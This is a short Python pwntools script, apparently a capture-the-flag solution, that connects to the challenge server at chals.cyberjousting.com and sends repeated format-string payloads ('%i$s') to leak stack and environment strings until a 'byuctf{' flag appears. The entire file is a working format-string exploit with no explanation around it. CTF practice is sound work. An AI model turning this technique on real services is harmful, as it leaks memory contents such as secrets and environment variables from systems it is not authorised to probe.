from pwn import *

# Set context
context.arch = 'amd64'

def leak_all_env():
    for start in range(1, 501, 50):
        r = remote('chals.cyberjousting.com', 1367)
        for attempt in range(5):
            payload = b'wrong'
            for i in range(start + attempt * 10, start + attempt * 10 + 10):
                payload += f"|%{i}$s".encode()
            if len(payload) > 99: payload = payload[:99]
            r.sendlineafter(b'?', payload)
            try:
                line = r.recvuntil(b'Try again.', timeout=1)
                if b'byuctf{' in line:
                    print(f"FOUND IT: {line}")
                    r.close()
                    return
            except:
                break
        r.close()

leak_all_env()
